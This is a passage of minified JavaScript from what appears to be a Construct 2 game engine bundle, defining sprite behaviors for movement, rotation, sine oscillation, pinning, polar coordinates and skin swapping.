CmdMoveKlass=function(t,e,i,s,n,r,o){this.Init(t,e,i,s,n,r,o)},CmdMoveKlassProto=CmdMoveKlass.prototype;CmdMoveKlassProto.Init=function(t,e,i,s,n,r,o){this.inst=t,this.move={max:e,acc:i,dec:s},this.isDone=!0,this.preciseMode=n,this.continuedMode=r,this.absoluteMode=o,this.currentSpeed=0},CmdMoveKlassProto.CmdInit=function(t,e,i){var s;this.target=t,this.dir=0<=e,this.remainDistance=Math.abs(e),this.isDone=!1,s=this.absoluteMode?this.inst.angleOffset:t.a,t.x+=e*Math.cos(s),t.y+=e*Math.sin(s),i&&speedReset.apply(this,i),setCurrentSpeed.call(this,null)},CmdMoveKlassProto.Tick=function(t){var e,t=getMoveDistance.call(this,t);return this.remainDistance-=t,e=this.remainDistance<=0||this.currentSpeed<=0?(this.isDone=!0,this.preciseMode?this.absoluteMode?(this.inst.xOffset=this.target.x,this.inst.yOffset=this.target.y):(this.inst.x=this.target.x,this.inst.y=this.target.y):(e=this.target.a,t+=this.remainDistance,this.dir||(t=-t),this.absoluteMode?(this.inst.xOffset+=t*Math.cos(e),this.inst.yOffset+=t*Math.sin(e),this.target.x=this.inst.xOffset,this.target.y=this.inst.yOffset):(this.inst.x+=t*Math.cos(e),this.inst.y+=t*Math.sin(e),this.target.x=this.inst.x,this.target.y=this.inst.y)),this.continuedMode?getRemaindDt.call(this):0):(e=this.absoluteMode?this.inst.angleOffset:this.target.a,this.dir||(t=-t),this.absoluteMode?(this.inst.xOffset+=t*Math.cos(e),this.inst.yOffset+=t*Math.sin(e)):(this.inst.x+=t*Math.cos(e),this.inst.y+=t*Math.sin(e)),0),this.absoluteMode||this.inst.set_bbox_changed(),e},CmdMoveKlassProto.saveToJSON=function(){return{v:this.move,id:this.isDone,pm:this.preciseMode,cspd:this.currentSpeed,offx:this.inst.xOffset,offy:this.inst.yOffset,abs:this.absoluteMode,dir:this.dir,rd:this.remainDistance}},CmdMoveKlassProto.loadFromJSON=function(t){this.move=t.v,this.isDone=t.id,this.preciseMode=t.pm,this.currentSpeed=t.cspd,this.dir=t.dir,this.remainDistance=t.rd,this.absoluteMode=t.abs,this.inst.xOffset=t.offx,this.inst.yOffset=t.offy};var CmdRotateKlass=function(t,e,i,s,n,r,o,a){this.Init(t,e,i,s,n,r,o,a)},CmdRotateKlassProto=CmdRotateKlass.prototype;CmdRotateKlassProto.Init=function(t,e,i,s,n,r,o,a){this.inst=t,this.rotatable=e,this.move={max:i,acc:s,dec:n},this.isDone=!0,this.isZeroDtMode=36e3<=i&&0==s&&0==n,this.preciseMode=r,this.continuedMode=o,this.absoluteMode=a,this.currentAngleDeg=e?cr.to_clamped_degrees(t.angle):0,this.currentSpeed=0},CmdRotateKlassProto.CmdInit=function(t,e,i){this.target=t,this.currentAngleDeg=cr.to_clamped_degrees(t.a),this.targetAngleDeg=this.currentAngleDeg+e,this.dir=0<=e;var s=cr.to_clamped_radians(this.targetAngleDeg);this.remainDistance=Math.abs(e),this.isDone=!1,t.a=s,i&&speedReset.apply(this,i),setCurrentSpeed.call(this,null)},CmdRotateKlassProto.Tick=function(t){var e,i;return this.isZeroDtMode?(e=t,this.isDone=!0,i=this.target.a,this.currentAngleDeg=this.targetAngleDeg):(t=getMoveDistance.call(this,t),this.remainDistance-=t,e=this.remainDistance<=0||this.currentSpeed<=0?(this.isDone=!0,this.preciseMode?(i=this.target.a,this.currentAngleDeg=this.targetAngleDeg):(t+=this.remainDistance,this.currentAngleDeg+=this.dir?t:-t,i=cr.to_clamped_radians(this.currentAngleDeg),this.target.a=i),1==this.continuedMode?getRemaindDt.call(this):0):(this.currentAngleDeg+=this.dir?t:-t,i=cr.to_clamped_radians(this.currentAngleDeg),0)),this.absoluteMode?this.inst.angleOffset=i:this.rotatable&&(this.inst.angle=i,this.inst.set_bbox_changed()),e},CmdRotateKlassProto.saveToJSON=function(){return{ra:this.rotatable,v:this.move,id:this.isDone,izm:this.isZeroDtMode,pm:this.preciseMode,cad:this.currentAngleDeg,cspd:this.currentSpeed,abs:this.absoluteMode,offa:this.inst.angleOffset,tad:this.targetAngleDeg,dir:this.dir,rd:this.remainDistance}},CmdRotateKlassProto.loadFromJSON=function(t){this.rotatable=t.ra,this.move=t.v,this.isDone=t.id,this.isZeroDtMode=t.izm,this.preciseMode=t.pm,this.currentAngleDeg=t.cad,this.currentSpeed=t.cspd,this.absoluteMode=t.abs,this.inst.angleOffset=t.offa,this.targetAngleDeg=t.tad,this.dir=t.dir,this.remainDistance=t.rd};var setCurrentSpeed=function(t){var e=this.move;null!=t?this.currentSpeed=t>e.max?e.max:t:0<e.acc?this.currentSpeed=0:this.currentSpeed=e.max},getMoveDistance=function(t){var e=this.move,i=!1;0!=e.dec&&(i=this.currentSpeed*this.currentSpeed/(2*e.dec)>=this.remainDistance);e=i?-e.dec:e.acc;return 0!=e&&setCurrentSpeed.call(this,this.currentSpeed+e*t),this.currentSpeed*t},getRemaindDt=function(){var t=0<this.move.acc||0<this.move.dec?(setCurrentSpeed.call(this,0),0):-this.remainDistance/this.currentSpeed;return t},speedReset=function(t,e,i){null!=t&&(this.move.max=t),null!=e&&(this.move.acc=e),null!=i&&(this.move.dec=i)},CmdWaitKlass=function(t){this.Init(t)},CmdWaitKlassProto=CmdWaitKlass.prototype;CmdWaitKlassProto.Init=function(t){this.isDone=!0,this.continuedMode=t},CmdWaitKlassProto.CmdInit=function(t,e){this.remainDistance=e,this.isDone=!1,this.target=t},CmdWaitKlassProto.Tick=function(t){var e;return this.remainDistance-=t,this.remainDistance<=0?(e=this.continuedMode?-this.remainDistance:0,this.isDone=!0):e=0,e},CmdWaitKlassProto.saveToJSON=function(){return{id:this.isDone,rd:this.remainDistance}},CmdWaitKlassProto.loadFromJSON=function(t){this.isDone=t.id,this.remainDistance=t.rd}}(),cr.behaviors.Rex_pushOutSolid=function(t){this.runtime=t},function(){var t=cr.behaviors.Rex_pushOutSolid.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){this.obstacleTypes=[]},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;e.onCreate=function(){this.enabled=1===this.properties[0],this.obstacleMode=this.properties[1],this.maxDist=100},e.onDestroy=function(){},e.tick=function(){this.enabled&&this.pushOutNearest(this.getCandidates(),this.maxDist)};var n=[];function i(){}e.getCandidates=function(){if((n.length=0)===this.obstacleMode){var t=this.runtime.getSolidBehavior();t&&cr.appendArray(n,t.my_instances.valuesRef())}else for(var e=this.type.obstacleTypes,i=e.length,s=0;s<i;s++)cr.appendArray(n,e[s].instances);return n},e.pushOutNearest=function(t,e){var i=this.inst,s=0,n=i.x,r=i.y,o=0,a=0,h=0,c=this.get_first_overlap_inst(t);if(!c)return!0;for(;s<=e;){switch(o){case 0:a=0,h=-1,s++;break;case 1:h=-(a=1);break;case 2:a=1,h=0;break;case 3:h=a=1;break;case 4:a=0,h=1;break;case 5:a=-1,h=1;break;case 6:a=-1,h=0;break;case 7:h=a=-1}if(o=(o+1)%8,i.x=cr.floor(n+a*s),i.y=cr.floor(r+h*s),i.set_bbox_changed(),!(c=this.get_first_overlap_inst(t,c)))return!0}return i.x=n,i.y=r,i.set_bbox_changed(),!1},e.pushOut=function(t,e,i,s){var n,r,o=this.inst,a=0,h=o.x,c=o.y,l=this.get_first_overlap_inst(t);if(!l)return!0;for(;a<=s;)if(a++,n=cr.floor(h+e*a),r=cr.floor(c+i*a),!(o.x===n&&o.y===r||(o.x=n,o.y=r,o.set_bbox_changed(),l=this.get_first_overlap_inst(t,l))))return!0;return o.x=h,o.y=c,o.set_bbox_changed(),!1},e.get_first_overlap_inst=function(t,e){if(e&&this.runtime.testOverlap(this.inst,e))return e;for(var i=t.length,s=0;s<i;s++)if(this.runtime.testOverlap(this.inst,t[s]))return t[s];return null},e.saveToJSON=function(){for(var t=[],e=0,i=this.type.obstacleTypes.length;e<i;e++)t.push(this.type.obstacleTypes[e].sid);return{en:this.enabled,obs:t}},e.loadFromJSON=function(t){this.enabled=t.en,cr.clearArray(this.type.obstacleTypes);for(var e,i=t.obs,s=0,n=i.length;s<n;s++)(e=this.runtime.getObjectTypeBySid(i[s]))&&this.type.obstacleTypes.push(e)},t.cnds=new function(){},t.acts=new i,i.prototype.SetEnabled=function(t){this.enabled=1===t},i.prototype.AddObstacle=function(t){if(t){var e=this.type.obstacleTypes;if(-1===e.indexOf(t)){for(var i,s=0,n=e.length;s<n;s++)if((i=e[s]).is_family&&-1!==i.members.indexOf(t))return;e.push(t)}}},i.prototype.ClearObstacles=function(){this.type.obstacleTypes.length=0},i.prototype.PushOutNearest=function(t){this.pushOutNearest(this.getCandidates(),t)},i.prototype.PushOutAngle=function(t,e){t=cr.to_radians(t);var i=Math.cos(t),t=Math.sin(t);this.pushOut(this.getCandidates(),i,t,e)},i.prototype.PushOutToPos=function(t,e){var i=t-this.inst.x,t=e-this.inst.y,e=Math.sqrt(i*i+t*t),t=Math.atan2(t,i),i=Math.cos(t),t=Math.sin(t);this.pushOut(this.getCandidates(),i,t,e)},t.exps=new function(){}}(),cr.behaviors.Sin=function(t){this.runtime=t},function(){var t=cr.behaviors.Sin.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,this.i=0};var e=t.Instance.prototype,i=2*Math.PI,s=Math.PI/2,n=3*Math.PI/2;function r(){}function o(){}function a(){}e.onCreate=function(){this.active=1===this.properties[0],this.movement=this.properties[1],this.wave=this.properties[2],this.period=this.properties[3],this.period+=Math.random()*this.properties[4],0===this.period?this.i=0:(this.i=this.properties[5]/this.period*i,this.i+=Math.random()*this.properties[6]/this.period*i),this.mag=this.properties[7],this.mag+=Math.random()*this.properties[8],this.initialValue=0,this.initialValue2=0,this.ratio=0,5===this.movement&&(this.mag=cr.to_radians(this.mag)),this.init()},e.saveToJSON=function(){return{i:this.i,a:this.active,mv:this.movement,w:this.wave,p:this.period,mag:this.mag,iv:this.initialValue,iv2:this.initialValue2,r:this.ratio,lkv:this.lastKnownValue,lkv2:this.lastKnownValue2}},e.loadFromJSON=function(t){this.i=t.i,this.active=t.a,this.movement=t.mv,this.wave=t.w,this.period=t.p,this.mag=t.mag,this.initialValue=t.iv,this.initialValue2=t.iv2||0,this.ratio=t.r,this.lastKnownValue=t.lkv,this.lastKnownValue2=t.lkv2||0},e.init=function(){switch(this.movement){case 0:this.initialValue=this.inst.x;break;case 1:this.initialValue=this.inst.y;break;case 2:this.initialValue=this.inst.width,this.ratio=this.inst.height/this.inst.width;break;case 3:this.initialValue=this.inst.width;break;case 4:this.initialValue=this.inst.height;break;case 5:this.initialValue=this.inst.angle;break;case 6:this.initialValue=this.inst.opacity;break;case 7:this.initialValue=0;break;case 8:this.initialValue=this.inst.x,this.initialValue2=this.inst.y}this.lastKnownValue=this.initialValue,this.lastKnownValue2=this.initialValue2},e.waveFunc=function(t){switch(t%=i,this.wave){case 0:return Math.sin(t);case 1:return t<=s?t/s:t<=n?1-2*(t-s)/Math.PI:(t-n)/s-1;case 2:return 2*t/i-1;case 3:return-2*t/i+1;case 4:return t<Math.PI?-1:1}return 0},e.tick=function(){var t=this.runtime.getDt(this.inst);this.active&&0!==t&&(0===this.period?this.i=0:(this.i+=t/this.period*i,this.i=this.i%i),this.updateFromPhase())},e.updateFromPhase=function(){switch(this.movement){case 0:this.inst.x!==this.lastKnownValue&&(this.initialValue+=this.inst.x-this.lastKnownValue),this.inst.x=this.initialValue+this.waveFunc(this.i)*this.mag,this.lastKnownValue=this.inst.x;break;case 1:this.inst.y!==this.lastKnownValue&&(this.initialValue+=this.inst.y-this.lastKnownValue),this.inst.y=this.initialValue+this.waveFunc(this.i)*this.mag,this.lastKnownValue=this.inst.y;break;case 2:this.inst.width=this.initialValue+this.waveFunc(this.i)*this.mag,this.inst.height=this.inst.width*this.ratio;break;case 3:this.inst.width=this.initialValue+this.waveFunc(this.i)*this.mag;break;case 4:this.inst.height=this.initialValue+this.waveFunc(this.i)*this.mag;break;case 5:this.inst.angle!==this.lastKnownValue&&(this.initialValue=cr.clamp_angle(this.initialValue+(this.inst.angle-this.lastKnownValue))),this.inst.angle=cr.clamp_angle(this.initialValue+this.waveFunc(this.i)*this.mag),this.lastKnownValue=this.inst.angle;break;case 6:this.inst.opacity=this.initialValue+this.waveFunc(this.i)*this.mag/100,this.inst.opacity<0?this.inst.opacity=0:1<this.inst.opacity&&(this.inst.opacity=1);break;case 8:this.inst.x!==this.lastKnownValue&&(this.initialValue+=this.inst.x-this.lastKnownValue),this.inst.y!==this.lastKnownValue2&&(this.initialValue2+=this.inst.y-this.lastKnownValue2),this.inst.x=this.initialValue+Math.cos(this.inst.angle)*this.waveFunc(this.i)*this.mag,this.inst.y=this.initialValue2+Math.sin(this.inst.angle)*this.waveFunc(this.i)*this.mag,this.lastKnownValue=this.inst.x,this.lastKnownValue2=this.inst.y}this.inst.set_bbox_changed()},e.onSpriteFrameChanged=function(t,e){switch(this.movement){case 2:this.initialValue*=e.width/t.width,this.ratio=e.height/e.width;break;case 3:this.initialValue*=e.width/t.width;break;case 4:this.initialValue*=e.height/t.height}},r.prototype.IsActive=function(){return this.active},r.prototype.CompareMovement=function(t){return this.movement===t},r.prototype.ComparePeriod=function(t,e){return cr.do_cmp(this.period,t,e)},r.prototype.CompareMagnitude=function(t,e){return 5===this.movement?cr.do_cmp(this.mag,t,cr.to_radians(e)):cr.do_cmp(this.mag,t,e)},r.prototype.CompareWave=function(t){return this.wave===t},t.cnds=new r,o.prototype.SetActive=function(t){this.active=1===t},o.prototype.SetPeriod=function(t){this.period=t},o.prototype.SetMagnitude=function(t){this.mag=t,5===this.movement&&(this.mag=cr.to_radians(this.mag))},o.prototype.SetMovement=function(t){5===this.movement&&5!==t&&(this.mag=cr.to_degrees(this.mag)),this.movement=t,this.init()},o.prototype.SetWave=function(t){this.wave=t},o.prototype.SetPhase=function(t){this.i=t*i%i,this.updateFromPhase()},o.prototype.UpdateInitialState=function(){this.init()},t.acts=new o,a.prototype.CyclePosition=function(t){t.set_float(this.i/i)},a.prototype.Period=function(t){t.set_float(this.period)},a.prototype.Magnitude=function(t){5===this.movement?t.set_float(cr.to_degrees(this.mag)):t.set_float(this.mag)},a.prototype.Value=function(t){t.set_float(this.waveFunc(this.i)*this.mag)},t.exps=new a}(),cr.behaviors.SkymenPin=function(t){this.runtime=t},function(){var t=cr.behaviors.SkymenPin.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.pinObject=null,this.pinObjectUid=-1,this.pinAngle=0,this.pinDist=0,this.myStartAngle=0,this.theirStartAngle=0,this.lastKnownAngle=0,this.mode=0,this.runOnTick=0==this.properties[0];var e=this;this.recycled||(this.myDestroyCallback=function(t){e.onInstanceDestroyed(t)}),this.runtime.addDestroyCallback(this.myDestroyCallback)},e.saveToJSON=function(){return{uid:this.pinObject?this.pinObject.uid:-1,pa:this.pinAngle,pd:this.pinDist,msa:this.myStartAngle,tsa:this.theirStartAngle,lka:this.lastKnownAngle,m:this.mode}},e.loadFromJSON=function(t){this.pinObjectUid=t.uid,this.pinAngle=t.pa,this.pinDist=t.pd,this.myStartAngle=t.msa,this.theirStartAngle=t.tsa,this.lastKnownAngle=t.lka,this.mode=t.m},e.afterLoad=function(){-1===this.pinObjectUid?this.pinObject=null:this.pinObject=this.runtime.getObjectByUID(this.pinObjectUid),this.pinObjectUid=-1},e.onInstanceDestroyed=function(t){this.pinObject==t&&(this.pinObject=null)},e.onDestroy=function(){this.pinObject=null,this.runtime.removeDestroyCallback(this.myDestroyCallback)},e.tick=function(){var t,e,i,s;this.pinObject&&this.runOnTick&&(this.lastKnownAngle!==this.inst.angle&&(this.myStartAngle=cr.clamp_angle(this.myStartAngle+(this.inst.angle-this.lastKnownAngle))),e=this.inst.x,i=this.inst.y,3===this.mode||4===this.mode?((t=cr.distanceTo(this.inst.x,this.inst.y,this.pinObject.x,this.pinObject.y))>this.pinDist||4===this.mode&&t<this.pinDist)&&(s=cr.angleTo(this.pinObject.x,this.pinObject.y,this.inst.x,this.inst.y),e=this.pinObject.x+Math.cos(s)*this.pinDist,i=this.pinObject.y+Math.sin(s)*this.pinDist):(e=this.pinObject.x+Math.cos(this.pinObject.angle+this.pinAngle)*this.pinDist,i=this.pinObject.y+Math.sin(this.pinObject.angle+this.pinAngle)*this.pinDist),s=cr.clamp_angle(this.myStartAngle+(this.pinObject.angle-this.theirStartAngle)),this.lastKnownAngle=s,0!==this.mode&&1!==this.mode&&3!==this.mode&&4!==this.mode||this.inst.x===e&&this.inst.y===i||(this.inst.x=e,this.inst.y=i,this.inst.set_bbox_changed()),0!==this.mode&&2!==this.mode||this.inst.angle===s||(this.inst.angle=s,this.inst.set_bbox_changed()))},e.tick2=function(){var t,e,i,s;this.pinObject&&!this.runOnTick&&(this.lastKnownAngle!==this.inst.angle&&(this.myStartAngle=cr.clamp_angle(this.myStartAngle+(this.inst.angle-this.lastKnownAngle))),e=this.inst.x,i=this.inst.y,3===this.mode||4===this.mode?((t=cr.distanceTo(this.inst.x,this.inst.y,this.pinObject.x,this.pinObject.y))>this.pinDist||4===this.mode&&t<this.pinDist)&&(s=cr.angleTo(this.pinObject.x,this.pinObject.y,this.inst.x,this.inst.y),e=this.pinObject.x+Math.cos(s)*this.pinDist,i=this.pinObject.y+Math.sin(s)*this.pinDist):(e=this.pinObject.x+Math.cos(this.pinObject.angle+this.pinAngle)*this.pinDist,i=this.pinObject.y+Math.sin(this.pinObject.angle+this.pinAngle)*this.pinDist),s=cr.clamp_angle(this.myStartAngle+(this.pinObject.angle-this.theirStartAngle)),this.lastKnownAngle=s,0!==this.mode&&1!==this.mode&&3!==this.mode&&4!==this.mode||this.inst.x===e&&this.inst.y===i||(this.inst.x=e,this.inst.y=i,this.inst.set_bbox_changed()),0!==this.mode&&2!==this.mode||this.inst.angle===s||(this.inst.angle=s,this.inst.set_bbox_changed()))},i.prototype.IsPinned=function(){return!!this.pinObject},t.cnds=new i,s.prototype.Pin=function(t,e){!t||(t=t.getFirstPicked(this.inst))&&(this.pinObject=t,this.pinAngle=cr.angleTo(t.x,t.y,this.inst.x,this.inst.y)-t.angle,this.pinDist=cr.distanceTo(t.x,t.y,this.inst.x,this.inst.y),this.myStartAngle=this.inst.angle,this.lastKnownAngle=this.inst.angle,this.theirStartAngle=t.angle,this.mode=e)},s.prototype.Unpin=function(){this.pinObject=null},t.acts=new s,n.prototype.PinnedUID=function(t){t.set_int(this.pinObject?this.pinObject.uid:-1)},t.exps=new n}(),cr.behaviors.SkymenPolarCoordinates=function(t){this.runtime=t},function(){var t=cr.behaviors.SkymenPolarCoordinates.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.Enabled=0==this.properties[4],this.Radius=this.properties[2],this.Angle=this.properties[3],this.OriginX=this.properties[0],this.OriginY=this.properties[1],this.ud=!1,this.Enabled&&this.update()},e.onDestroy=function(){},e.saveToJSON=function(){return{DX:this.Radius,DY:this.Angle,OX:this.OriginX,OY:this.OriginY,Enabled:this.Enabled}},e.loadFromJSON=function(t){this.Radius=t.DX,this.Angle=t.DY,this.OriginX=t.OX,this.OriginY=t.OY,this.Enabled=t.Enabled,this.update()},e.update=function(t=1){0===t&&(this.Radius=this.inst.x,this.Angle=this.inst.y),this.ud=!0},e.tick=function(){359<this.Angle&&(this.Angle=this.Angle%360),this.ud&&(this.inst.x=this.OriginX+Math.cos(this.Angle*Math.PI/180)*this.Radius,this.inst.y=this.OriginY+Math.sin(this.Angle*Math.PI/180)*this.Radius,this.inst.set_bbox_changed(),this.ud=!1)},e.tick2=function(){},i.prototype.IsEnabled=function(){return this.Enabled},i.prototype.CompareRadius=function(t,e){return cr.do_cmp(this.Radius,t,e)},i.prototype.CompareAngle=function(t,e){return cr.do_cmp(this.Angle,t,e)},i.prototype.CompareOriginX=function(t,e){return cr.do_cmp(this.OriginX,t,e)},i.prototype.CompareOriginY=function(t,e){return cr.do_cmp(this.OriginY,t,e)},t.cnds=new i,s.prototype.SetEnabled=function(t){0===t?(this.Enabled=!0,this.update()):this.Enabled=!1},s.prototype.SetRadius=function(t){this.Enabled&&(this.Radius=t,this.update())},s.prototype.SetAngle=function(t){this.Enabled&&(this.Angle=t,this.update())},s.prototype.SetDeltaPos=function(t,e){this.Enabled&&(this.Radius=t,this.Angle=e,this.update())},s.prototype.SetOriginX=function(t){this.Enabled&&(this.OriginX=t,this.update())},s.prototype.SetOriginY=function(t){this.Enabled&&(this.OriginY=t,this.update())},s.prototype.SetOriginPos=function(t,e){this.Enabled&&(this.OriginX=t,this.OriginY=e,this.update())},s.prototype.Update=function(t){this.update(t)},t.acts=new s,n.prototype.Radius=function(t){t.set_float(this.Radius)},n.prototype.Angle=function(t){t.set_float(this.Angle)},n.prototype.DeltaX=function(t){t.set_float(this.Radius)},n.prototype.DeltaY=function(t){t.set_float(this.Angle)},n.prototype.OriginX=function(t){t.set_float(this.OriginX)},n.prototype.OriginY=function(t){t.set_float(this.OriginY)},n.prototype.CarToPolRad=function(t,e,i,s,n){e-=s,i-=n;i=Math.sqrt(Math.pow(e,2)+Math.pow(i,2));t.set_float(i)},n.prototype.CarToPolAngle=function(t,e,i,s,n){e-=s,i-=n;e=180*Math.atan2(i,e)/Math.PI;t.set_float(e)},n.prototype.PolToCarX=function(t,e,i,s){e=s+Math.cos(i*Math.PI/180)*e,e=Math.floor(1e3*e)/1e3;t.set_float(e)},n.prototype.PolToCarY=function(t,e,i,s){e=s+Math.sin(i*Math.PI/180)*e,e=Math.floor(1e3*e)/1e3;t.set_float(e)},n.prototype.Status=function(t){this.Enabled?t.set_string("Enabled"):t.set_string("Disabled")},t.exps=new n}(),cr.behaviors.SkymenSkin=function(t){this.runtime=t},function(){var t=cr.behaviors.SkymenSkin.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}function n(){}e.onCreate=function(){this.skinBaseTag=this.properties[0],null==cr.SkymenSkinCore?alert("Skin base plugin needed, please create it."):null==cr.SkymenSkinCore[this.skinBaseTag]?alert("Skin base with tag "+this.skinBaseTag+" cannot be found."):(this.skinBase=cr.SkymenSkinCore[this.skinBaseTag],this.skinBase.addInstance(this)),this.skinTag=this.properties[1],this.subSkinTag=this.properties[2],this.oldSkinTag=this.properties[1],this.oldSubSkinTag=this.properties[2],this.syncWithAnim=0===this.properties[3]||2===this.properties[3],this.syncWithFrame=1===this.properties[3]||2===this.properties[3],this.default=0===this.properties[4],this.hideDefault=0===this.properties[5],this.imagePoint=this.properties[6],this.syncZOrder=0===this.properties[7],this.syncSize=1===this.properties[8],this.syncScale=2===this.properties[8],this.firstFrame=!0,this.widthRatio=1,this.heightRatio=1,this.lastLayout=this.runtime.running_layout,this.object=null,this.inst.behaviorSkins||(this.inst.behaviorSkins=[]);var e=!1;for(let t=0;t<this.inst.behaviorSkins.length;t++)this===this.inst.behaviorSkins[t]&&(e=!0,this.behaviorId=t);e||(this.behaviorId=this.inst.behaviorSkins.length,this.inst.behaviorSkins.push(this)),this.skinBase.init&&this.updateSkin()},e.onDestroy=function(){this.destroy()},e.saveToJSON=function(){return{skinTag:this.skinTag,subSkinTag:this.subSkinTag,oldSkinTag:this.oldSkinTag,oldSubSkinTag:this.oldSubSkinTag,syncWithAnim:this.syncWithAnim,syncWithFrame:this.syncWithFrame,default:this.default,hideDefault:this.hideDefault,imagePoint:this.imagePoint,syncZOrder:this.syncZOrder,syncSize:this.syncSize,syncScale:this.syncScale,firstFrame:this.firstFrame,skinBaseTag:this.skinBaseTag,behaviorId:this.behaviorId}},e.loadFromJSON=function(t){this.skinTag=t.skinTag,this.subSkinTag=t.subSkinTag,this.oldSkinTag=t.oldSkinTag,this.oldSubSkinTag=t.oldSubSkinTag,this.syncWithAnim=t.syncWithAnim,this.syncWithFrame=t.syncWithFrame,this.default=t.default,this.hideDefault=t.hideDefault,this.imagePoint=t.imagePoint,this.syncZOrder=t.syncZOrder,this.firstFrame=t.firstFrame,this.skinBaseTag=t.skinBaseTag,this.behaviorId=t.behaviorId,this.syncSize=t.syncSize,this.syncScale=t.syncScale},e.tick=function(){this.firstFrame&&(this.syncWithAnim&&(this.subSkinTag=this.inst.cur_animation.name,this.oldsubSkinTag=this.inst.cur_animation.name),this.firstFrame=!1)},e.tick2=function(){if(null!=this.object){var t,e,i,s=this.inst.getImagePoint(this.imagePoint,!0),n=this.inst.getImagePoint(this.imagePoint,!1),r=this.inst.angle,o=this.inst.cur_animation.name;this.syncSize||this.syncScale?(this.object.width!=this.inst.width*this.widthRatio&&(this.object.width=this.inst.width*this.widthRatio),this.object.height!=this.inst.height*this.heightRatio&&(this.object.height=this.inst.height*this.heightRatio)):(t=this.inst.width<0,e=this.object.width<0,a=this.inst.height<0,i=this.object.height<0,t!=e&&(this.object.width=cr.abs(this.object.width)*(t?-1:1)),a!=i&&(this.object.height=cr.abs(this.object.height)*(a?-1:1)));var a=this.inst;if(0!=this.behaviorId){for(var h=this.behaviorId-1;0<=h&&null==this.inst.behaviorSkins[h].object;)h--;0<=h&&(a=this.inst.behaviorSkins[h].object)}this.syncZOrder&&this.object.get_zindex()!==a.get_zindex()+1&&this.setZorder(),this.object.x!=s&&(this.object.x=s),this.object.y!=n&&(this.object.y=n),this.object.angle!=r&&(this.object.angle=r),this.object.set_bbox_changed(),this.syncWithAnim&&this.subSkinTag!=o&&(this.subSkinTag=o),this.syncWithFrame&&this.inst.cur_frame!=this.object.cur_frame&&cr.plugins_.Sprite.prototype.acts.SetAnimFrame.call(this.object,this.inst.cur_frame),this.skinTag==this.oldSkinTag&&this.subSkinTag==this.oldSubSkinTag||(this.oldSkinTag=this.skinTag,this.oldSubSkinTag=this.subSkinTag,this.updateSkin())}},e.updateSkin=function(){if(this.default)return null!=this.object&&this.destroy(),void(this.hideDefault&&!this.inst.visible&&(this.inst.visible=!0,this.runtime.redraw=!0));if(this.hideDefault&&this.inst.visible&&(this.inst.visible=!1,this.runtime.redraw=!0),null==this.object){this.inst&&this.inst.cur_animation&&(e=this.inst.cur_animation.name,this.syncWithAnim&&this.subSkinTag!=e&&(this.subSkinTag=e));var t=this.getType(this.skinTag,this.subSkinTag);if(null==t)return console.warn("Cannot assign subskin "+this.subSkinTag+" of skin "+this.skinTag+" because it doesn't exist. Reverting back to default."),this.default=!0,void this.updateSkin();this.syncWithAnim&&(this.subSkinTag=this.inst.cur_animation.name),this.object=this.inst.runtime.createInstance(t,this.inst.layer);var e=this.getAnim(this.skinTag,this.subSkinTag);cr.plugins_.Sprite.prototype.acts.SetAnim.call(this.object,e,0),this.syncWithFrame&&cr.plugins_.Sprite.prototype.acts.SetAnimSpeed.call(this.object,0),this.setZorder(),cr.plugins_.Sprite.prototype.acts.SetCollisions.call(this.object,0),this.syncScale?(t=(t=this.object.type.animations.find(t=>t.name===this.object.type.default_instance[5][4]))||this.object.type.animations[0],this.widthRatio=this.inst.width/Math.abs(this.inst.width)*this.object.type.default_instance[0][3]/t.frames[0].width*this.object.cur_animation.frames[0].width/this.inst.width,this.heightRatio=this.inst.height/Math.abs(this.inst.height)*this.object.type.default_instance[0][4]/t.frames[0].height*this.object.cur_animation.frames[0].height/this.inst.height):this.syncSize&&(this.widthRatio=1,this.heightRatio=1,this.object.width=this.inst.width,this.object.height=this.inst.height)}else this.object.type==this.getType(this.skinTag,this.subSkinTag)?(this.syncWithAnim&&(this.subSkinTag=this.inst.cur_animation.name),e=this.getAnim(this.skinTag,this.subSkinTag),cr.plugins_.Sprite.prototype.acts.SetAnim.call(this.object,e,0),this.syncWithFrame&&cr.plugins_.Sprite.prototype.acts.SetAnimSpeed.call(this.object,0),this.syncZOrder&&this.setZorder(),cr.plugins_.Sprite.prototype.acts.SetCollisions.call(this.object,0)):(this.destroy(),this.updateSkin())},e.destroy=function(){if(null!==this.object){if(this.object.behaviorSkins)for(var t=0;t<this.object.behaviorSkins.length;t++)this.object.behaviorSkins[t].destroy();this.runtime.DestroyInstance(this.object),this.object=null}},e.setZorder=function(){var t=this.inst;if(0!=this.behaviorId){for(var e=this.behaviorId-1;0<=e&&null==this.inst.behaviorSkins[e].object;)e--;0<=e&&(t=this.inst.behaviorSkins[e].object)}this.object.layer.index!==t.layer.index&&(this.object.layer.removeFromInstanceList(this.object,!0),this.object.layer=t.layer,t.layer.appendToInstanceList(this.object,!0)),this.object.layer.moveInstanceAdjacent(this.object,t,!0),this.runtime.redraw=!0},e.getType=function(t,e){return null==this.skinBase.skins[t]||null==this.skinBase.skins[t][e]?null:this.skinBase.skins[t][e].type},e.getAnim=function(t,e){return null==this.skinBase.skins[t]||null==this.skinBase.skins[t][e]?null:this.skinBase.skins[t][e].anim},i.prototype.IsDefault=function(){return this.default},i.prototype.IsSkin=function(t){return this.skinTag==t},i.prototype.IsSubSkin=function(t){return this.subSkinTag==t},i.prototype.IsDefaultHidden=function(){return 